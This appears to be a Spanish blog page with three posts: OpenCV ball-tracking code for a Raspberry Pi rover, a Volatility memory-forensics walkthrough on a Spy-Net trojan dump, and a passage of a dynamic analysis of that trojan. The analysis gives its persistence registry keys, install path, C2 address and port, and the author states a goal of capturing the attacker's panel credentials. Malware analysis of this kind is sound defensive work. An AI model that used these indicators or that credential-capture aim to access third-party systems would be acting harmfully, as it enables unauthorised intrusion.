  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://pulsosocial.com/wp-content/uploads/2014/09/mira.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://pulsosocial.com/wp-content/uploads/2014/09/mira.png" height="300" width="400" /></a></div><div style="text-align: right;"><b>by hdbreaker</b><br /><b><br /></b></div><div style="text-align: left;">Hace tiempo estoy trabajando en un proyecto de robotica trabajando con Raspberry PI, el objetivo final? Construir un Rover Teledirigido y Autonomo, como <br /><a name='more'></a>es esto?<br />por medio de la programación de distintos modulos que le permitan trabajar de forma Autonoma o Teledirigida. El lenguaje elegido fue Python por el excelente soporte y cantidad de librerías que van de la mano junto con RPI.<br /><br />En esta entrada, tratare sobre el desarrollo de un Sistema de seguimiento de Objetos, con el cual al final de cuentas manejo, la aceleración y los movimientos laterales del Robot al seguir una pelota de tenis.<br /><br />Para esto utilizo unas librerías especiales multiplataforma que vienen de la mano de: <a href="http://opencv.org/">http://opencv.org/</a></div><div style="text-align: left;"><br /><b>Como se instala?</b> (Recuerden que trabajamos sobre un entorno Debian)</div><div style="text-align: left;"></div><div style="text-align: left;"><br />sudo apt-get install python-opencv<br /><b><br />Como se utiliza?</b><br /><br />En nuestro IDE preferido (<a href="https://www.jetbrains.com/pycharm/">Pycharm</a>) debemos importar la siguiente librería:<br /><span style="color: red;"><br />import cv2</span><br /><br />Una vez hecho esto podemos ponernos a trabajar<br /><br /><b>Como funciona?</b>OpenCV trabaja realizando filtros especiales a los FPS realizados por la cámara, por lo que podemos manipular las imágenes tomadas dependiendo lo que queramos rastrear. Podemos filtrar por color y bordes (lo que más nos interesa) entre otros<br /><br />Lectura Recomendada:<br /><a href="http://alereimondo.no-ip.org/OpenCV/uploads/41/tema3.pdf">http://alereimondo.no-ip.org/OpenCV/uploads/41/tema3.pdf</a><br /><br />Vamos por partes:<br /><br />Establecemos el puerto de video /dev/video{Number}</div><div style="text-align: left;"></div><div style="text-align: left;"></div><div style="text-align: left;"></div><div style="text-align: left;"><pre class="brush: py"><br />self.capture = cv2.VideoCapture(1)<br /></pre>Creamos Filtros:<br /><br /><pre class="brush: py">img = cv2.GaussianBlur(orig_img, (5,5), 0)&lt;/div&gt;<br />img = cv2.cvtColor(orig_img, cv2.COLOR_BGR2HSV)<br />img = cv2.resize(img, (len(orig_img[0]) / self.scale_down, len(orig_img) / self.scale_down))<br /></pre></div><div style="text-align: left;"></div><br />Establecemos los colores a buscar por los filtros: <br /><div style="text-align: left;"></div><br /><pre class="brush: py">gren_lower = np.array([50, 100, 100])<br />gren_upper = np.array([70, 255, 255])<br /></pre><br />Iniciamos los Filtros:<br /><br /><pre class="brush: py">gren_binary = cv2.inRange(img, gren_lower, gren_upper)<br />dilation = np.ones((15, 15), "uint8")<br />gren_binary = cv2.dilate(gren_binary, dilation)</pre>Obtenemos Contornos:<br /><br /><pre class="brush: py">contours, hierarchy = cv2.findContours(gren_binary, cv2.RETR_LIST, cv2.CHAIN_APPROX_SIMPLE)<br />max_area = 0<br />largest_contour = None</pre>Generamos Circulo de Enfoque:<br /><br /><pre class="brush: py">(x,y),radius = cv2.minEnclosingCircle(contour)<br />x = rect[0][0] * self.scale_down<br />y = rect[0][1] * self.scale_down<br />center = (int(x),int(y))<br />radius = int(radius)<br />cv2.circle(orig_img,center,radius,(0,255,0),2)</pre>Codigo Completo:<br /><br /><pre class="brush: py">import cv2, math<br />import numpy as np<br />class ColourTracker:<br />&nbsp;&nbsp;&nbsp; def __init__(self):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cv2.namedWindow("ColourTrackerWindow", cv2.CV_WINDOW_AUTOSIZE)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; self.capture = cv2.VideoCapture(1)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; self.scale_down = 4<br />&nbsp;&nbsp;&nbsp; def run(self):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while True:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; f, orig_img = self.capture.read()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; orig_img = cv2.flip(orig_img, 1)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #Creo Filtros<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; img = cv2.GaussianBlur(orig_img, (5,5), 0)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; img = cv2.cvtColor(orig_img, cv2.COLOR_BGR2HSV)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; img = cv2.resize(img, (len(orig_img[0]) / self.scale_down, len(orig_img) / self.scale_down))<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #Establesco colores a Filtrar<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gren_lower = np.array([50, 100, 100])<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gren_upper = np.array([70, 255, 255])<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #Inicio los Filtros<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gren_binary = cv2.inRange(img, gren_lower, gren_upper)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dilation = np.ones((15, 15), "uint8")<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gren_binary = cv2.dilate(gren_binary, dilation)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #Obtengo contornos<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; contours, hierarchy = cv2.findContours(gren_binary, cv2.RETR_LIST, cv2.CHAIN_APPROX_SIMPLE)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; max_area = 0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; largest_contour = None<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for idx, contour in enumerate(contours):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; area = cv2.contourArea(contour)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if area &gt; max_area:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; max_area = area<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; largest_contour = contour<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if not largest_contour == None:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; moment = cv2.moments(largest_contour)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if moment["m00"] &gt; 1000 / self.scale_down:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rect = cv2.minAreaRect(largest_contour)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #Genero un ciruclo de enfoque<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (x,y),radius = cv2.minEnclosingCircle(contour)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; x = rect[0][0] * self.scale_down<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; y = rect[0][1] * self.scale_down<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; center = (int(x),int(y))<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; radius = int(radius)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cv2.circle(orig_img,center,radius,(0,255,0),2)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #Muestro el resultado<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cv2.imshow("ColourTrackerWindow", orig_img)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #En Base a X giro hacia un lado u otro<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(x&gt;450):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print("giro a la derecha")<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(x&lt;150):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print("giro a la izquierda")<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print("centrado")<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if cv2.waitKey(20) == 27:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cv2.destroyWindow("ColourTrackerWindow")<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; self.capture.release()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break<br />if __name__ == "__main__":<br />&nbsp;&nbsp;&nbsp; colour_tracker = ColourTracker()<br />&nbsp;&nbsp;&nbsp; colour_tracker.run()<br /><br /></pre><br /><div style="text-align: center;"><b>Resultado</b></div><br /><div class="separator" style="clear: both; text-align: center;"><object width="520" height="466" class="BLOG_video_class" id="BLOG_video-16ae2567ad9af2fa" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0"><param name="movie" value="//www.youtube.com/get_player"><param name="bgcolor" value="#FFFFFF"><param name="allowfullscreen" value="true"><param name="flashvars" value="flvurl=http://redirector.googlevideo.com/videoplayback?id%3D16ae2567ad9af2fa%26itag%3D5%26source%3Dblogger%26app%3Dblogger%26cmo%3Dsensitive_content%253Dyes%26ip%3D0.0.0.0%26ipbits%3D0%26expire%3D1472323371%26sparams%3Did,itag,source,ip,ipbits,expire%26signature%3D365970008ABCBD2BFD29D6BE3D0FF64D2A83355C.ACBEB49B63D60729B278E789F6225F047A6BCDF6%26key%3Dck2&amp;iurl=http://video.google.com/ThumbnailServer2?app%3Dblogger%26contentid%3D16ae2567ad9af2fa%26offsetms%3D5000%26itag%3Dw160%26sigh%3Dz3QVki1UKec2JJmtXJPNe0OxVlk&amp;autoplay=0&amp;ps=blogger"><embed src="//www.youtube.com/get_player" type="application/x-shockwave-flash" width="520" height="466" bgcolor="#FFFFFF" flashvars="flvurl=http://redirector.googlevideo.com/videoplayback?id%3D16ae2567ad9af2fa%26itag%3D5%26source%3Dblogger%26app%3Dblogger%26cmo%3Dsensitive_content%253Dyes%26ip%3D0.0.0.0%26ipbits%3D0%26expire%3D1472323371%26sparams%3Did,itag,source,ip,ipbits,expire%26signature%3D365970008ABCBD2BFD29D6BE3D0FF64D2A83355C.ACBEB49B63D60729B278E789F6225F047A6BCDF6%26key%3Dck2&iurl=http://video.google.com/ThumbnailServer2?app%3Dblogger%26contentid%3D16ae2567ad9af2fa%26offsetms%3D5000%26itag%3Dw160%26sigh%3Dz3QVki1UKec2JJmtXJPNe0OxVlk&autoplay=0&ps=blogger" allowFullScreen="true" /></object></div><div style="text-align: center;"><b><br /></b><br /><div style="text-align: left;">Les dejo una Imagen del estado actual del proyecto:<br /><br /><div style="text-align: center;"><a href="http://2.bp.blogspot.com/-LoVMcxERzdM/VMGrqXeZFkI/AAAAAAAAAQQ/mxuqFE3oxDc/s1600/Ioby.jpg" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-LoVMcxERzdM/VMGrqXeZFkI/AAAAAAAAAQQ/mxuqFE3oxDc/s1600/Ioby.jpg" height="360" width="640" /></a></div></div><div style="text-align: left;"></div>Estas entradas continuarán con todo el ensamblado y el código del Robot</div></div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/01/18/analizando-el-volcado-con-volatility/">Analizando El Volcado Con Volatility</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2015-01-18T21:25:00-08:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://4.bp.blogspot.com/-twwCqW1nXIA/UMpAPqJwj8I/AAAAAAAAC3c/mqUJ9xxSF8U/w392-h300-n-k/v.png" height="305" onclick="zoomToggle('640px','305px','100%','100%',this);" width="400" /></div><div style="text-align: right;"><b>by hdbreaker</b></div><br />Este post pretende ser una extensión del aporte Análisis Dinámico de Spy-Net, los invito a repasar los antiguos post para no perder el hilo del tema<br /><a name='more'></a><br /><br /><a href="http://www.securitysignal.tk/2015/01/analisis-estatico-spy-net.html">Análisis Estático Spy-Net</a> y <a href="http://www.securitysignal.tk/2015/01/analisis-dinamico-spy-net.html">Análisis Dinámico Spy-Net</a><br /><br />En este post retomaremos desde el momento en que generamos el volcado de memoria con DumpIT, pero esta vez analizaremos su contenido con Volatility, un framework desarrollado especificamente para el <b>Análisis de Volcados de Memoria</b>, Gracias a [Q]3rv[0] por la recomendación<br /><br />Este framework nos permitirá rapidamente aislar las secciones de memoria de un proceso comprometido para reducir la cantidad de memoria a analizar. Lo que resalta de este framework es que al estar totalmente programado en python permite utilizarlo con la distribución que mas nos guste, en mi caso usare un Ubuntu 14.04 un poco tuneado por mi, ganando estabilidad y teniendo todas las herramientas que me permitirán potenciar el alcance de Volatility<br /><br />Instalacion de Volatility:<br /><br />Descargamos la versión mas reciente de Volatility desde la fuente original del proyecto:<br /><a href="https://code.google.com/p/volatility/downloads/list">https://code.google.com/p/volatility/downloads/list</a><br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://imageupper.com/s02/1/7/K14206173401502812_9.png" height="72" onclick="zoomToggle('640px','72px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div><br />Luego lo descomprimimos, nos movemos a su ubicación y ejecutamos:<br /><br /><pre class="brush: bash">sudo python setup.py install</pre><br />Aguardamos la finalización y listo, hora de trabajar con Volatility.<br /><h2 style="text-align: center;">Volatility</h2>Primero: Damos una leida a todo lo que nos ofrece este gran framework: <br /><span style="color: red;">vol.py -h</span><br /><br /><div style="text-align: center;"><img border="0" src="http://imageupper.com/s02/1/7/K14206173401502812_1.png" height="213" onclick="zoomToggle('640px','213px','100%','100%',this);" width="640" /></div><div style="text-align: center;">(la verdad es que no me da la pantalla para mostrar toda la ayuda, va a depender de su mano explorar un poco más)</div><br />Lo sorprendente de este framework es la cantidad de plugins que posee para extender el alcance del Forense.<br /><br />Ahora que conocen un poco sobre Volatility, retomemos el Análisis.<br /><br />Obtenemos un volcado de memoria con DumpIT (mem.raw) tal como vimos en el post anterior, una vez listo lo copiamos a linux, y procemos a analizarlo.<br /><br /><pre class="brush: bash">vol.py -f mem.raw imageinfo (esto nos devuelve el profile correspondiente a nuestro volcado)</pre><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://imageupper.com/s02/1/7/K14206173401502812_8.png" height="233" onclick="zoomToggle('640px','233px','100%','100%',this);" width="640" /></div><br />Una vez indentificado el profile en nuestro caso: <b>Win7SP0x86</b> pasaremos a recuperar los procesos que se encontraban en ejecución en ese momento:<br /><br /><pre class="brush: bash">vol.py -f mem.raw --profile=Win7SP0x86 pslist</pre><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://imageupper.com/s02/1/7/K14206173401502812_4.png" height="272" onclick="zoomToggle('640px','272px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div>Al final de la imagen podemos apreciar <span style="color: red;">explorer.exe</span>, el cual es el proceso que identificamos realizaba la conexión al host remoto.<br />A este proceso lo detectamos con CurrPorts, pero podemos identificarlo mucho mas rápido y sin necesidad de instalar un programa externo<br />ejecutando el comando: <span style="color: red;">netstat -b </span><br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://imageupper.com/s02/1/7/K14206173401502812_6.png" height="164" onclick="zoomToggle('640px','164px','100%','100%',this);" width="640" /></div><div style="text-align: center;">(Como se puede apreciar el host/ip, puerto y proceso que realiza la conexión)</div><br />Con volatility aislaremos todas las secciones de memoria que pertenecen a explorer.exe generando un Subvolcado de la memoria, para eso nos ayudaremos del plugin: memdump&nbsp; <br />Para esto necesitaremos el PID de explorer.exe que nos arrojo pslist (1344)<br /><br /><pre class="brush: bash">vol.py -f mem.raw --profile=Win7SP0x86 -p 1344 memdump -D ./ (Esto nos generar un Subvolcado PID.dmp)</pre><br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://imageupper.com/s02/1/7/K14206173401502812_7.png" height="80" onclick="zoomToggle('640px','80px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div>Con esto hemos reducido el peso de 268 Mb a 203 Mb (esto significa, muchisimas lineas menos que analizar :) )<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://imageupper.com/s02/1/5/U1420617918150274_2.png" height="184" onclick="zoomToggle('640px','184px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div>Pero recordemos que al final, en este caso, solo analizamos las cadenas de texto dentro de la memoria, por lo cual en este subvolcado todavía hay mucho codigo binario que no nos interesa, para reducirlo aun más nos ayudaremos de una poderosa herramienta de linux, que ya muchos deben conocer: <b>strings</b><br /><br /><pre class="brush: bash">strings 1344.dmp &gt;&gt; explorer.txt</pre><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://imageupper.com/s02/1/7/K14206173401502812_2.png" height="214" onclick="zoomToggle('640px','214px','100%','100%',this);" width="640" /></div><br />El resultado es sorprendente son solo 6 Mb de Strings para analizar, y no solo eso... con la ayuda de <b>grep</b> podemos obtener resultados filtrados a la velocidad de un chasquido.<br /><br /><b>Memorandum:</b><br /><b><br /></b><b>¿Que buscar?</b><br /><b>no-ip, ddns, explorer.exe, update.exe, Juego.exe, Claves de Registros, etc</b><br /><br />La verdad es con la primer busqueda nos va demaciado bien:<br /><br /><pre class="brush: bash">cat explorer.txt | grep no-ip</pre><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://imageupper.com/s02/1/5/U1420617918150274_1.png" height="40" onclick="zoomToggle('640px','40px','100%','100%',this);" width="640" /></div><br />Conclusión:<br /><br />Con el Framework Volatility hemos reducido el proceso de busqueda de información a menos de 5 minutos (realmente me tomo 5 minutos de reloj encontrar esta información) cuando analizando todo el volcado desde un editor hexadecimal tariamos mucho mas (recuerden que este volcado es de 256 Mb imaginen un volcado de 4 u 8 Gb), con este metodo corremos el riesgo de perder caracteres binarios especiales, que sean importantes para el malware y no necesariamente sean un string, pero es un framework muy poderoso y recomendable!<br /><br /><div style="text-align: center;"><b>Happy Hunting :)</b></div></div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/01/18/analisis-dinamico-spy-net/">Análisis Dinámico Spy-Net</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2015-01-18T21:05:00-08:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://imagenes.publico.es/resources/archivos/2012/9/5/1346865764139genomadn.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://imagenes.publico.es/resources/archivos/2012/9/5/1346865764139genomadn.jpg" height="480" onclick="zoomToggle('640px','300px','100%','100%',this);" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: right;"><b>by hdbreaker</b></div>Continuando con la entrada anterior:<br /><br /><a href="http://www.securitysignal.tk/2015/01/analisis-estatico-spy-net.html">Análisis Estático Spy-net</a><br /><br />Voy a realizar el Análisis Dinámico de la Infección, para los que no recuerden el escenario <br /><a name='more'></a>es el siguiente:<br /><br />La victima ejecuta un binario de Spy-Net que prometía ser un juego en su pc, este no nota nada inusual nisiquiera una ventana de instalación en su pc,intenta nuevamente la ejecución pero nuevamente nada sucede y antes de decidirse a borrar el archivo se pregunta, estaré siendo victima de un malware... La diferencia radica que esta vez realizaremos un Análisis Dinámico, para identificar el Agresor y desinfectarnos exitosamente...<br /><br />Los Datos Recopilados con el Análisis Estático fueron los siguientes:<br /><br />Troyano: Spy-Net<br /><br />Registros de Autoinicio:<br /><span style="color: red;">"Software\Microsoft\Windows\CurrentVersion\Run"<br />"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"</span><br />Ubicación del Malware: <span style="color: red;">C:\Windows\EIS\update.exe</span><br /><br />Rutas de Configuracion MSConfig:<br /><span style="color: red;">"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupfolder"<br />"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg" </span><br /><br /><b>Espectativas</b>: Lograr identificar host y puerto donde se conecta el malware, obtener credenciales necesarias para entrar al panel y de existir, obtener las credenciales asociadas a la recopilación de logs.<br /><br /><br />Primero usaremos Process Monitor para identificar los nuevos procesos que se general al ejecutar el Malware:<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://imageupper.com/s02/1/10/Q1420597131194083_4.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div>Como podemos apreciar en la imagen, al ejecutar Juego.exe tambien podemos apreciar que aparece en ejecución el proceso update.exe<br />si vemos la ruta de su ejecución podemos apreciar su dirección de destino:<br /><br /><span style="color: red;">"C:\Windows\EIS\update.exe"</span> (La misma que encontramos con nuestro Análisis Estático)<br /><br />Ya con esta información, cerramos Process Monitor, abrimos Process Explorer y ejecutamos nuevamente el Juego.exe:<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://imageupper.com/s02/1/10/Q1420597131194083_6.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><br />Luego de algunos intentos (ya que el proceso se cierra para ocultarse del análisis) logramos ingresar a sus propiedades.<br />Al Analizar las mismas no notamos nada extraño. <br /><br />La pregunta ahora es, que hace <span style="color: red;">"C:\Windows\EIS\update.exe"</span>, asi que vamos hacia la dirección ejecutamos el binario y volvemos<br />a analizar con Process Explorer:<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://imageupper.com/s02/1/10/Q1420597131194083_5.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><br />Podemos ver que update.exe tiene una ruta de AutoStart:<br /><span style="color: red;">"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\HKLM"</span><br />Entonces procedemos a ejecutar CurrPorts para ver si el malware esta realizando algun tipo de conexión hacia el exterior:<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://imageupper.com/s02/1/10/Q1420597131194083_12.png" height="60" onclick="zoomToggle('640px','60px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div><br />En este apartado podemos notar muy claramente que hay una conexión hacia el host remoto 181.23.131.19 en el puerto 9667<br />pero para nuestra sorpresa notamos que el proceso que realiza la conexión es "Explorer.EXE" y no "Juego.exe" o "update.exe" como esperábamos. Podemos deducir que el Malware migra intentando ocultarse hacia el Proceso Explorer.EXE<br /><br />En este punto se presenta la duda... ¿Podre capturar el trafico que realiza mi pc hacia el host remoto? ¿Podre obtener las credenciales para validar el malware? ¿Enviara logs a algun dominio, podre obtener sus credenciales?<br /><br />Nos ponemos manos a la obra, e iniciamos Wireshark:<br />En este paso vamos a realizar algo importante, primero vamos a apagar la maquina Victima, en ese momento iniciaremos Wireshark y aplicaremos el siguiente filtro:<br /><br /><span style="color: red;"><b>"ip.dst==181.23.131.19 &amp;&amp; tcp.port==9667"</b></span><br /><br />Luego volveremos a iniciar la pc Victima.<br />Esto nos permitirá capturar desde la primer conexión que realice el Troyano al 